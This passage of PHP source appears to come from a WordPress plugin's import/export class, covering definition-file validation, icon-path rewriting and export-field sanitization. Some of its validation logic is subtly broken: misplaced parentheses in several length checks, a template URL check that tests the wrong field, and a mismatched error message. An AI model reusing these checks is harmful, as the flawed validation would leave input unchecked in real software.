	 * an empty string.
	 *
	 * @return string
	 */
	public function get_subdir() {
			$info = parse_url(site_url());
			if (isset($info['path'])) {
				return $info['path'];
			}
			return '';
	}

	//------------------------------------------------------------------------------
	/**
	 * Used to check the names of uploaded files -- also passed in URLs
	 * Basename only! Not full path!
	 * 
	 * @param	string	file basename, e.g. 'my_def.cctm.json'
	 * @return	boolean	false if it's a bad filename, true if it's legit.
	 */
	public static function is_valid_basename($basename) {
		if ( empty($basename) ) {
			return false;
		}
		//  Must have the .cctm.json extension
		if ( !preg_match('/'.self::extension.'$/i', $basename) ) {
			return false;
		}
		$cnt;
		$basename = str_replace(self::extension, '', $basename, $cnt);
		if ( preg_match('/[^a-z_\-0-9]/i', $basename) ) {
			return false;
		}
		// I guess the filename is legit.
		return true;
	}

	
	/**
	 * Given an array, we make sure it's a valid for use as a CCTM definition.
	 * This checks the validity of a 0.9.4 version of the data structure.
	 * .cctm.json files from older versions aren't compatible.
	 *
	 * @param	array		mixed data structure
	 * @return	boolean 	true if the structure is valid
	 */
	public static function is_valid_def_structure($data) {

		if ( !is_array($data) ) {
			return false;
		}
		
		// Check the required keys
		if ( !isset($data['post_type_defs']) 
			|| !isset($data['custom_field_defs'])
			|| !isset($data['export_info']) ) {
		
			return false;	
		}

		// and a bit of the stamping stuff...
		if ( !isset($data['export_info']['_timestamp_export'])) {
			return false;
		}
		elseif ( !isset($data['export_info']['_source_site'])) {
			return false;
		}
		elseif ( !isset($data['export_info']['_charset'])) {
			return false;
		}
		elseif ( !isset($data['export_info']['_language'])) {
			return false;
		}
		elseif ( !isset($data['export_info']['_wp_version'])) {
			return false;
		}
		elseif ( !isset($data['export_info']['_cctm_version'])) {
			return false;
		}
		elseif ( !isset($data['export_info']['title'])) {
			return false;
		}
		elseif ( !isset($data['export_info']['author'])) {
			return false;
		}
		elseif ( !isset($data['export_info']['url'])) {
			return false;
		}
		elseif ( !isset($data['export_info']['template_url'])) {
			return false;
		}
		elseif ( !isset($data['export_info']['description'])) {
			return false;
		}
		
		// If we make it here, it's a thumbs-up
		return true;
	}
	
	/**
	 * Given an array, we make sure it's a valid import package
	 *
	 * @param	array		mixed data structure
	 * @return	boolean 	true if the structure is valid
	 */
	public static function is_valid_upload_structure($data) {
		if ( !is_array($data) ) {
			return false;
		}
		elseif ( !isset($data['export_info'])) {
			return false;
		}
		elseif ( !isset($data['export_info']['_timestamp_export'])) {
			return false;
		}		
		elseif ( !isset($data['export_info']['_source_site'])) {
			return false;
		}
		elseif ( !isset($data['export_info']['_charset'])) {
			return false;
		}
		elseif ( !isset($data['export_info']['_language'])) {
			return false;
		}
		elseif ( !isset($data['export_info']['_wp_version'])) {
			return false;
		}
		elseif ( !isset($data['export_info']['_cctm_version'])) {
			return false;
		}
		elseif ( !isset($data['payload'])) {
			return false;
		}

		return self::is_valid_def_structure($data['payload']);
	}	
	


	/**
	 * The preview data object is stored nextdoor in a neighboring option:
	 
	 */
	public static function import_from_preview() {
	
		$settings = get_option(CCTM::db_key_settings, array() );
		$candidate = CCTM::get_value($settings, 'candidate');
		$new_data = CCTM::get_value($candidate, 'payload');

		// Clean up icon URLs: make them absolute again. See the ImportExport::export_to_desktop function
		// and issue 64:http://code.google.com/p/wordpress-custom-content-type-manager/issues/detail?id=64
		foreach ( $new_data as $post_type => $def ) {
			if ( isset($new_data[$post_type]['menu_icon']) && !empty($new_data[$post_type]['menu_icon']) ) {
				$new_data[$post_type]['menu_icon'] = self::make_img_path_abs($new_data[$post_type]['menu_icon']);
			}
		}
		update_option( CCTM::db_key, $new_data );
	}


	/**
	 *
	 */
	public static function import_from_pastebin() {

	}

	//------------------------------------------------------------------------------
	/**
	 * Given a filename of a def file, load up the file and convert it to a data
	 * structure.  Errors are set if there are problems (CCTM::$errors).
	 *
	 * @param	string	filename (including path)
	 * @return	mixed	
	 */
	public static function load_def_file($filename) {

		if (!file_exists($filename)) {
			CCTM::$errors['definition_not_found'] = sprintf(__('The definition file could not be found: %s', CCTM_TXTDOMAIN), "<code>$filename</code>");
			return array();
		}
		$def_str = file_get_contents($filename);
		$def = json_decode($def_str, true);
		if (!$def) {
			CCTM::$errors['json_decode_error'] = sprintf(__('There was a problem with the JSON decoding of the definition file: %s', CCTM_TXTDOMAIN), "<code>$filename</code>");
			return array();		
		}
		
		if (!self::is_valid_def_structure($def)) {
			CCTM::$errors['definition_structure_invalid'] 
				= sprintf(__('The data structure in the file was not in the correct format: %s. This could be because the file is from an older version of the CCTM plugin.  See the <a href="http://code.google.com/p/wordpress-custom-content-type-manager/wiki/Import" target="_new">Wiki</a> for more information.', CCTM_TXTDOMAIN), "<code>$filename</code>");
			return array();			
		}
		
		// Correct for stripped image paths IF this is being installed on a site where WP is
		// installed in a sub dir.
		$subdir = self::get_subdir();
		if ($subdir) {
			foreach ($def['post_type_defs'] as $post_type => &$d) {
				if (isset($d['menu_icon'])) {
					$d['menu_icon'] = '/'. $subdir . $d['menu_icon'];
				}
			}
		}
				
		return $def;
	}
	
	/**
	 * Make any relative image paths absolute on the new server. Image paths
	 * including a full url (e.g. "http://something...") will be ignored
	 * and returned unaltered.
	 *
	 * See make_img_path_rel() for more info about the problem that 
	 * this is solving.
	 *
	 * @param	string	URL representing an image.
	 * @param	string	Absolute URL
	 */
	public static function make_img_path_abs($src) {
		$parts = parse_url($src);
		if (isset($parts['host']) ) {
			return $src; // <-- path is already absolute
		}
		elseif ( !isset($parts['path'])) {
			return $src; // Just in case the parse_url() fails
		}
		else {
			// Here we manage the potential leading slash...
			$parts['path'] = preg_replace('|^/?|','', $parts['path']);
			return site_url() .'/'. $parts['path'];
		}
	}
	
	/**
	 * When storing image paths, esp. for the custom post type icons, the full URL
	 * is typically used, but if we are going to import and export definitions, 
	 * that will break the definitions that use custom icons.  The solution is 
	 * to strip the site url from the image path prior to export, then append it 
	 * prior to import. This should allow images hosted on another domain to be
	 * used without being affected.
	 *
	 * This function should only act on images hosted locally on the same domain
	 * listed by the site_url();
	 *
	 * @param	string	$src	a full path to an image, e.g."http://x.com/my.jpg"
	 *							OR "/sub/wp-content/plugins/custom-content-type-manager/images/icons/16x16/wizard.png"
	 * @return	string	a relative path to that image, e.g. "my.jpg"
	 */
	public static function make_img_path_rel($src) {
		// If left-most character is '/', then chop it and the subdir off
		if ('/' == substr($src, 0 ,1)) {
			if(self::get_subdir()) {
				return str_replace('/'.self::get_subdir(), '', $src);
			}
			else {
				return substr($src, 1); // chop off leading slash
			}
		}
		return str_replace(site_url(), '', $src);
	}


	//------------------------------------------------------------------------------
	/**
	 * Sanitize posted data for a clean export.  This just ensures that the user 
	 * has entered some info about what they are about to export.
	 *
	 * @param	mixed	$raw = $_POST data
	 * @param	string	name of nonce (optional)
	 * @return	mixed	sanitized post data
	 */
	public static function sanitize_export_params($raw, $nonce_name='') {
		// cleanup
		unset($raw[ $nonce_name ]);
		unset($raw['_wp_http_referer']);

	
		$sanitized = array();
		// title
		if ( empty($raw['title'])) {
			CCTM::$errors['title'] = __('Title is required.', CCTM_TXTDOMAIN);
		}
		elseif ( preg_match('/[^a-z\s\-\._0-9]/i', $raw['title']) ) {
			CCTM::$errors['title'] = __('Only basic text characters are allowed for the title.', CCTM_TXTDOMAIN);
		}
		elseif ( strlen($raw['title'] > 64) ) {
			CCTM::$errors['title'] = __('The title cannot exceed 64 characters.', CCTM_TXTDOMAIN);
		}
		
		// author
		if ( empty($raw['author'])) {
			CCTM::$errors['author'] = __('Author is required.', CCTM_TXTDOMAIN);
		}
		elseif ( preg_match('/[^a-z\s\-_0-9\.@]/i', $raw['author']) ) {
			CCTM::$errors['author'] = __('Only basic characters are allowed for the author field.', CCTM_TXTDOMAIN);
		}
		elseif ( strlen($raw['author']) > 64 ) {
			CCTM::$errors['author'] = __('The author name cannot exceed 32 characters.', CCTM_TXTDOMAIN);
		}
		
		// url
		if ( empty($raw['url'])) {
			$raw['url'] = site_url(); // defaults to this site
		}
		elseif ( !preg_match('|^http(s)?://[a-z0-9-]+(.[a-z0-9-]+)*(:[0-9]+)?(/.*)?$|i', $raw['url']) ) {
			CCTM::$errors['url'] = __('The URL must be in a standard format, e.g. http://yoursite.com.', CCTM_TXTDOMAIN);
		}
		elseif ( strlen($raw['url'] > 255) ) {
			CCTM::$errors['url'] = __('The URL cannot exceed 255 characters.', CCTM_TXTDOMAIN);
		}

		// template_url
		if ( empty($raw['template_url'])) {
			$raw['template_url'] = ''; // do nothing :)
		}
		elseif ( !preg_match('|^http(s)?://[a-z0-9-]+(.[a-z0-9-]+)*(:[0-9]+)?(/.*)?$|i', $raw['url']) ) {
			CCTM::$errors['template_url'] = __('The template URL must be in a standard format, e.g. http://themeforest.com.', CCTM_TXTDOMAIN);
		}
		elseif ( strlen($raw['template_url'] > 255) ) {
			CCTM::$errors['template_url'] = __('The template URL cannot exceed 255 characters.', CCTM_TXTDOMAIN);
		}

		// description		
		if ( empty($raw['description'])) {
			CCTM::$errors['description'] = __('Description is required.', CCTM_TXTDOMAIN);
		}
		elseif ( strlen($raw['description'] > 1024) ) {
			CCTM::$errors['description'] = __('The description cannot exceed 1024 characters.', CCTM_TXTDOMAIN);
		}

		// HTML entities cleanup
		$sanitized['title'] 		= htmlspecialchars( substr( preg_replace('/[^a-z\s\-\._0-9]/i', '', trim($raw['title']) ), 0, 64) );
		$sanitized['author'] 		= htmlspecialchars( substr( preg_replace('/[^a-z\s\-_0-9\.@]/i', '', trim($raw['author']) ), 0, 64) );
		$sanitized['url'] 			= htmlspecialchars( substr( trim($raw['url']), 0, 255) );
		$sanitized['template_url'] 	= htmlspecialchars( substr( trim($raw['template_url']), 0, 255) );
		$sanitized['description'] 	= htmlspecialchars( substr( strip_tags( trim($raw['description']) ), 0, 1024) );
		
		return $sanitized;
	}

	/**
	 * Take a data structure and return true or false as to whether or not it's
	 * in the correct format for a CCTM definition.
	 */
	public static function validate_data_structure($data) {
		// move portions from CCTM::_sanitize_import_params
	}

}


/*EOF*/